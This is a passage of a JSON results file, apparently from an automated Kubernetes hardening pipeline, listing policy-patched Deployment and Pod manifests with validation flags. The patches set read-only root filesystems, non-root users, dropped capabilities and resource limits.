    "id": "01047",
    "policy_id": "read_only_root_fs",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    run: test\n  name: test18\n  namespace: default\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      run: test\n  template:\n    metadata:\n      labels:\n        run: test\n    spec:\n      containers:\n      - image: docker.io/dgeiger/alpine@sha256:5555555\n        name: container1\n        securityContext:\n          readOnlyRootFilesystem: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n      - image: docker.io/dgeiger/nginx@sha256:e770165fef9e36b990882a4083d8ccf5e29e469a8609bb6b2e3b47d9510e2c8d\n        name: container2\n        securityContext:\n          readOnlyRootFilesystem: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n",
    "errors": []
  },
  {
    "id": "01048",
    "policy_id": "run_as_non_root",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    run: test\n  name: test18\n  namespace: default\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      run: test\n  template:\n    metadata:\n      labels:\n        run: test\n    spec:\n      containers:\n      - image: docker.io/dgeiger/alpine@sha256:5555555\n        name: container1\n        securityContext:\n          runAsNonRoot: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          readOnlyRootFilesystem: true\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n      - image: docker.io/dgeiger/nginx@sha256:e770165fef9e36b990882a4083d8ccf5e29e469a8609bb6b2e3b47d9510e2c8d\n        name: container2\n        securityContext:\n          runAsNonRoot: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          readOnlyRootFilesystem: true\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n",
    "errors": []
  },
  {
    "id": "01049",
    "policy_id": "run_as_non_root",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    run: test\n  name: test18\n  namespace: default\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      run: test\n  template:\n    metadata:\n      labels:\n        run: test\n    spec:\n      containers:\n      - image: docker.io/dgeiger/alpine@sha256:5555555\n        name: container1\n        securityContext:\n          runAsNonRoot: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          readOnlyRootFilesystem: true\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n      - image: docker.io/dgeiger/nginx@sha256:e770165fef9e36b990882a4083d8ccf5e29e469a8609bb6b2e3b47d9510e2c8d\n        name: container2\n        securityContext:\n          runAsNonRoot: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          readOnlyRootFilesystem: true\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n",
    "errors": []
  },
  {
    "id": "01050",
    "policy_id": "set_requests_limits",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    run: test\n  name: test18\n  namespace: default\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      run: test\n  template:\n    metadata:\n      labels:\n        run: test\n    spec:\n      containers:\n      - image: docker.io/dgeiger/alpine@sha256:5555555\n        name: container1\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n        securityContext:\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n          readOnlyRootFilesystem: true\n      - image: docker.io/dgeiger/nginx@sha256:e770165fef9e36b990882a4083d8ccf5e29e469a8609bb6b2e3b47d9510e2c8d\n        name: container2\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n        securityContext:\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n          readOnlyRootFilesystem: true\n",
    "errors": []
  },
  {
    "id": "01051",
    "policy_id": "set_requests_limits",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    run: test\n  name: test18\n  namespace: default\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      run: test\n  template:\n    metadata:\n      labels:\n        run: test\n    spec:\n      containers:\n      - image: docker.io/dgeiger/alpine@sha256:5555555\n        name: container1\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n        securityContext:\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n          readOnlyRootFilesystem: true\n      - image: docker.io/dgeiger/nginx@sha256:e770165fef9e36b990882a4083d8ccf5e29e469a8609bb6b2e3b47d9510e2c8d\n        name: container2\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n        securityContext:\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n          readOnlyRootFilesystem: true\n",
    "errors": []
  },
  {
    "id": "01052",
    "policy_id": "set_requests_limits",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    run: test\n  name: test18\n  namespace: default\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      run: test\n  template:\n    metadata:\n      labels:\n        run: test\n    spec:\n      containers:\n      - image: docker.io/dgeiger/alpine@sha256:5555555\n        name: container1\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n        securityContext:\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n          readOnlyRootFilesystem: true\n      - image: docker.io/dgeiger/nginx@sha256:e770165fef9e36b990882a4083d8ccf5e29e469a8609bb6b2e3b47d9510e2c8d\n        name: container2\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n        securityContext:\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n          readOnlyRootFilesystem: true\n",
    "errors": []
  },
  {
    "id": "01053",
    "policy_id": "set_requests_limits",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    run: test\n  name: test18\n  namespace: default\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      run: test\n  template:\n    metadata:\n      labels:\n        run: test\n    spec:\n      containers:\n      - image: docker.io/dgeiger/alpine@sha256:5555555\n        name: container1\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n        securityContext:\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n          readOnlyRootFilesystem: true\n      - image: docker.io/dgeiger/nginx@sha256:e770165fef9e36b990882a4083d8ccf5e29e469a8609bb6b2e3b47d9510e2c8d\n        name: container2\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n        securityContext:\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n          readOnlyRootFilesystem: true\n",
    "errors": []
  },
  {
    "id": "01054",
    "policy_id": "no_latest_tag",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: monitoring\n  name: grafana-deployment\nspec:\n  selector:\n    matchLabels:\n      app: grafana-deployment\n  template:\n    metadata:\n      labels:\n        app: grafana-deployment\n    spec:\n      securityContext:\n        runAsUser: 472\n        fsGroup: 472\n      containers:\n      - name: grafana\n        image: grafana/grafana:stable\n        env:\n        - name: GF_SECURITY_ADMIN_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: gf-security-admin-password-secret\n              key: gf_security_admin_password\n        - name: GF_INSTALL_PLUGINS\n          value: grafana-clock-panel,grafana-piechart-panel,camptocamp-prometheus-alertmanager-datasource,vonage-status-panel,alexanderzobnin-zabbix-app,grafana-worldmap-panel,raintank-worldping-app,agenty-flowcharting-panel\n        ports:\n        - containerPort: 3000\n        volumeMounts:\n        - name: grafana-storage\n          mountPath: /var/lib/grafana\n        securityContext:\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          privileged: false\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n          readOnlyRootFilesystem: true\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n      volumes:\n      - name: grafana-storage\n        persistentVolumeClaim:\n          claimName: grafana-pvc\n",
    "errors": []
  },
  {
    "id": "01055",
    "policy_id": "read_only_root_fs",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: monitoring\n  name: grafana-deployment\nspec:\n  selector:\n    matchLabels:\n      app: grafana-deployment\n  template:\n    metadata:\n      labels:\n        app: grafana-deployment\n    spec:\n      securityContext:\n        runAsUser: 472\n        fsGroup: 472\n      containers:\n      - name: grafana\n        image: grafana/grafana:stable\n        env:\n        - name: GF_SECURITY_ADMIN_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: gf-security-admin-password-secret\n              key: gf_security_admin_password\n        - name: GF_INSTALL_PLUGINS\n          value: grafana-clock-panel,grafana-piechart-panel,camptocamp-prometheus-alertmanager-datasource,vonage-status-panel,alexanderzobnin-zabbix-app,grafana-worldmap-panel,raintank-worldping-app,agenty-flowcharting-panel\n        ports:\n        - containerPort: 3000\n        volumeMounts:\n        - name: grafana-storage\n          mountPath: /var/lib/grafana\n        securityContext:\n          readOnlyRootFilesystem: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n      volumes:\n      - name: grafana-storage\n        persistentVolumeClaim:\n          claimName: grafana-pvc\n",
    "errors": []
  },
  {
    "id": "01056",
    "policy_id": "set_requests_limits",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: monitoring\n  name: grafana-deployment\nspec:\n  selector:\n    matchLabels:\n      app: grafana-deployment\n  template:\n    metadata:\n      labels:\n        app: grafana-deployment\n    spec:\n      securityContext:\n        runAsUser: 472\n        fsGroup: 472\n      containers:\n      - name: grafana\n        image: grafana/grafana:stable\n        env:\n        - name: GF_SECURITY_ADMIN_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: gf-security-admin-password-secret\n              key: gf_security_admin_password\n        - name: GF_INSTALL_PLUGINS\n          value: grafana-clock-panel,grafana-piechart-panel,camptocamp-prometheus-alertmanager-datasource,vonage-status-panel,alexanderzobnin-zabbix-app,grafana-worldmap-panel,raintank-worldping-app,agenty-flowcharting-panel\n        ports:\n        - containerPort: 3000\n        volumeMounts:\n        - name: grafana-storage\n          mountPath: /var/lib/grafana\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n        securityContext:\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n          readOnlyRootFilesystem: true\n      volumes:\n      - name: grafana-storage\n        persistentVolumeClaim:\n          claimName: grafana-pvc\n",
    "errors": []
  },
  {
    "id": "01057",
    "policy_id": "set_requests_limits",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: monitoring\n  name: grafana-deployment\nspec:\n  selector:\n    matchLabels:\n      app: grafana-deployment\n  template:\n    metadata:\n      labels:\n        app: grafana-deployment\n    spec:\n      securityContext:\n        runAsUser: 472\n        fsGroup: 472\n      containers:\n      - name: grafana\n        image: grafana/grafana:stable\n        env:\n        - name: GF_SECURITY_ADMIN_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: gf-security-admin-password-secret\n              key: gf_security_admin_password\n        - name: GF_INSTALL_PLUGINS\n          value: grafana-clock-panel,grafana-piechart-panel,camptocamp-prometheus-alertmanager-datasource,vonage-status-panel,alexanderzobnin-zabbix-app,grafana-worldmap-panel,raintank-worldping-app,agenty-flowcharting-panel\n        ports:\n        - containerPort: 3000\n        volumeMounts:\n        - name: grafana-storage\n          mountPath: /var/lib/grafana\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n        securityContext:\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n          readOnlyRootFilesystem: true\n      volumes:\n      - name: grafana-storage\n        persistentVolumeClaim:\n          claimName: grafana-pvc\n",
    "errors": []
  },
  {
    "id": "01058",
    "policy_id": "no_latest_tag",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: test-taint\nspec:\n  containers:\n  - name: nginx-image\n    image: nginx:stable\n    securityContext:\n      capabilities:\n        drop:\n        - NET_RAW\n        - NET_ADMIN\n        - SYS_ADMIN\n        - SYS_MODULE\n        - SYS_PTRACE\n        - SYS_CHROOT\n      privileged: false\n      allowPrivilegeEscalation: false\n      runAsNonRoot: true\n      readOnlyRootFilesystem: true\n    resources:\n      requests:\n        cpu: 100m\n        memory: 128Mi\n      limits:\n        cpu: 500m\n        memory: 256Mi\n",
    "errors": []
  },
  {
    "id": "01059",
    "policy_id": "read_only_root_fs",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: test-taint\nspec:\n  containers:\n  - name: nginx-image\n    image: nginx:stable\n    securityContext:\n      readOnlyRootFilesystem: true\n      privileged: false\n      capabilities:\n        drop:\n        - NET_RAW\n        - NET_ADMIN\n        - SYS_ADMIN\n        - SYS_MODULE\n        - SYS_PTRACE\n        - SYS_CHROOT\n      allowPrivilegeEscalation: false\n      runAsNonRoot: true\n    resources:\n      requests:\n        cpu: 100m\n        memory: 128Mi\n      limits:\n        cpu: 500m\n        memory: 256Mi\n",
    "errors": []
  },
  {
    "id": "01060",
    "policy_id": "run_as_non_root",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: test-taint\nspec:\n  containers:\n  - name: nginx-image\n    image: nginx:stable\n    securityContext:\n      runAsNonRoot: true\n      privileged: false\n      capabilities:\n        drop:\n        - NET_RAW\n        - NET_ADMIN\n        - SYS_ADMIN\n        - SYS_MODULE\n        - SYS_PTRACE\n        - SYS_CHROOT\n      allowPrivilegeEscalation: false\n      readOnlyRootFilesystem: true\n    resources:\n      requests:\n        cpu: 100m\n        memory: 128Mi\n      limits:\n        cpu: 500m\n        memory: 256Mi\n",
    "errors": []
  },
  {
    "id": "01061",
    "policy_id": "set_requests_limits",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: test-taint\nspec:\n  containers:\n  - name: nginx-image\n    image: nginx:stable\n    resources:\n      requests:\n        cpu: 100m\n        memory: 128Mi\n      limits:\n        cpu: 500m\n        memory: 256Mi\n    securityContext:\n      privileged: false\n      capabilities:\n        drop:\n        - NET_RAW\n        - NET_ADMIN\n        - SYS_ADMIN\n        - SYS_MODULE\n        - SYS_PTRACE\n        - SYS_CHROOT\n      allowPrivilegeEscalation: false\n      runAsNonRoot: true\n      readOnlyRootFilesystem: true\n",
    "errors": []
  },
  {
    "id": "01062",
    "policy_id": "set_requests_limits",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: test-taint\nspec:\n  containers:\n  - name: nginx-image\n    image: nginx:stable\n    resources:\n      requests:\n        cpu: 100m\n        memory: 128Mi\n      limits:\n        cpu: 500m\n        memory: 256Mi\n    securityContext:\n      privileged: false\n      capabilities:\n        drop:\n        - NET_RAW\n        - NET_ADMIN\n        - SYS_ADMIN\n        - SYS_MODULE\n        - SYS_PTRACE\n        - SYS_CHROOT\n      allowPrivilegeEscalation: false\n      runAsNonRoot: true\n      readOnlyRootFilesystem: true\n",
    "errors": []
  },
  {
    "id": "01063",
    "policy_id": "no_latest_tag",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: addresses-service-deployment\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: addresses-service\n  template:\n    metadata:\n      labels:\n        app: addresses-service\n    spec:\n      containers:\n      - name: addresses-service\n        image: stokei/addresses-service:stable\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n        imagePullPolicy: Always\n        env:\n        - name: DB_NAME\n          value: addresses\n        - name: DB_HOST\n          valueFrom:\n            secretKeyRef:\n              name: mongodb-secret\n              key: db-host\n        - name: DB_PORT\n          valueFrom:\n            secretKeyRef:\n              name: mongodb-secret\n              key: db-port\n        - name: DB_USER\n          valueFrom:\n            secretKeyRef:\n              name: mongodb-secret\n              key: db-user\n        - name: DB_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: mongodb-secret\n              key: db-password\n        - name: DB_OPTIONS\n          valueFrom:\n            secretKeyRef:\n              name: mongodb-secret\n              key: db-options\n        - name: DB_PREFIX\n          valueFrom:\n            secretKeyRef:\n              name: mongodb-secret\n              key: db-prefix\n        - name: DB_TIMEOUT\n          valueFrom:\n            secretKeyRef:\n              name: mongodb-secret\n              key: db-timeout\n        - name: QUEUE_HOST\n          valueFrom:\n            secretKeyRef:\n              name: redis-secret\n              key: queue-host\n        - name: QUEUE_PORT\n          valueFrom:\n            secretKeyRef:\n              name: redis-secret\n              key: queue-port\n        - name: QUEUE_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: redis-secret\n              key: queue-password\n        - name: QUEUE_TIMEOUT\n          valueFrom:\n            secretKeyRef:\n              name: redis-secret\n              key: queue-timeout\n        - name: MICROSERVICE_URL\n          valueFrom:\n            secretKeyRef:\n              name: rabbitmq-secret\n              key: url\n        securityContext:\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          privileged: false\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n          readOnlyRootFilesystem: true\n",
    "errors": []
  },
  {
    "id": "01064",
    "policy_id": "read_only_root_fs",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: addresses-service-deployment\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: addresses-service\n  template:\n    metadata:\n      labels:\n        app: addresses-service\n    spec:\n      containers:\n      - name: addresses-service\n        image: stokei/addresses-service:stable\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n        imagePullPolicy: Always\n        env:\n        - name: DB_NAME\n          value: addresses\n        - name: DB_HOST\n          valueFrom:\n            secretKeyRef:\n              name: mongodb-secret\n              key: db-host\n        - name: DB_PORT\n          valueFrom:\n            secretKeyRef:\n              name: mongodb-secret\n              key: db-port\n        - name: DB_USER\n          valueFrom:\n            secretKeyRef:\n              name: mongodb-secret\n              key: db-user\n        - name: DB_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: mongodb-secret\n              key: db-password\n        - name: DB_OPTIONS\n          valueFrom:\n            secretKeyRef:\n              name: mongodb-secret\n              key: db-options\n        - name: DB_PREFIX\n          valueFrom:\n            secretKeyRef:\n              name: mongodb-secret\n              key: db-prefix\n        - name: DB_TIMEOUT\n          valueFrom:\n            secretKeyRef:\n              name: mongodb-secret\n              key: db-timeout\n        - name: QUEUE_HOST\n          valueFrom:\n            secretKeyRef:\n              name: redis-secret\n              key: queue-host\n        - name: QUEUE_PORT\n          valueFrom:\n            secretKeyRef:\n              name: redis-secret\n              key: queue-port\n        - name: QUEUE_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: redis-secret\n              key: queue-password\n        - name: QUEUE_TIMEOUT\n          valueFrom:\n            secretKeyRef:\n              name: redis-secret\n              key: queue-timeout\n        - name: MICROSERVICE_URL\n          valueFrom:\n            secretKeyRef:\n              name: rabbitmq-secret\n              key: url\n        securityContext:\n          readOnlyRootFilesystem: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n",
    "errors": []
  },
  {
    "id": "01065",
    "policy_id": "run_as_non_root",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: addresses-service-deployment\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: addresses-service\n  template:\n    metadata:\n      labels:\n        app: addresses-service\n    spec:\n      containers:\n      - name: addresses-service\n        image: stokei/addresses-service:stable\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n        imagePullPolicy: Always\n        env:\n        - name: DB_NAME\n          value: addresses\n        - name: DB_HOST\n          valueFrom:\n            secretKeyRef:\n              name: mongodb-secret\n              key: db-host\n        - name: DB_PORT\n          valueFrom:\n            secretKeyRef:\n              name: mongodb-secret\n              key: db-port\n        - name: DB_USER\n          valueFrom:\n            secretKeyRef:\n              name: mongodb-secret\n              key: db-user\n        - name: DB_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: mongodb-secret\n              key: db-password\n        - name: DB_OPTIONS\n          valueFrom:\n            secretKeyRef:\n              name: mongodb-secret\n              key: db-options\n        - name: DB_PREFIX\n          valueFrom:\n            secretKeyRef:\n              name: mongodb-secret\n              key: db-prefix\n        - name: DB_TIMEOUT\n          valueFrom:\n            secretKeyRef:\n              name: mongodb-secret\n              key: db-timeout\n        - name: QUEUE_HOST\n          valueFrom:\n            secretKeyRef:\n              name: redis-secret\n              key: queue-host\n        - name: QUEUE_PORT\n          valueFrom:\n            secretKeyRef:\n              name: redis-secret\n              key: queue-port\n        - name: QUEUE_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: redis-secret\n              key: queue-password\n        - name: QUEUE_TIMEOUT\n          valueFrom:\n            secretKeyRef:\n              name: redis-secret\n              key: queue-timeout\n        - name: MICROSERVICE_URL\n          valueFrom:\n            secretKeyRef:\n              name: rabbitmq-secret\n              key: url\n        securityContext:\n          runAsNonRoot: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          readOnlyRootFilesystem: true\n",
    "errors": []
  },
  {
    "id": "01066",
    "policy_id": "set_requests_limits",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: addresses-service-deployment\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: addresses-service\n  template:\n    metadata:\n      labels:\n        app: addresses-service\n    spec:\n      containers:\n      - name: addresses-service\n        image: stokei/addresses-service:stable\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n        imagePullPolicy: Always\n        env:\n        - name: DB_NAME\n          value: addresses\n        - name: DB_HOST\n          valueFrom:\n            secretKeyRef:\n              name: mongodb-secret\n              key: db-host\n        - name: DB_PORT\n          valueFrom:\n            secretKeyRef:\n              name: mongodb-secret\n              key: db-port\n        - name: DB_USER\n          valueFrom:\n            secretKeyRef:\n              name: mongodb-secret\n              key: db-user\n        - name: DB_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: mongodb-secret\n              key: db-password\n        - name: DB_OPTIONS\n          valueFrom:\n            secretKeyRef:\n              name: mongodb-secret\n              key: db-options\n        - name: DB_PREFIX\n          valueFrom:\n            secretKeyRef:\n              name: mongodb-secret\n              key: db-prefix\n        - name: DB_TIMEOUT\n          valueFrom:\n            secretKeyRef:\n              name: mongodb-secret\n              key: db-timeout\n        - name: QUEUE_HOST\n          valueFrom:\n            secretKeyRef:\n              name: redis-secret\n              key: queue-host\n        - name: QUEUE_PORT\n          valueFrom:\n            secretKeyRef:\n              name: redis-secret\n              key: queue-port\n        - name: QUEUE_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: redis-secret\n              key: queue-password\n        - name: QUEUE_TIMEOUT\n          valueFrom:\n            secretKeyRef:\n              name: redis-secret\n              key: queue-timeout\n        - name: MICROSERVICE_URL\n          valueFrom:\n            secretKeyRef:\n              name: rabbitmq-secret\n              key: url\n        securityContext:\n          privileged: 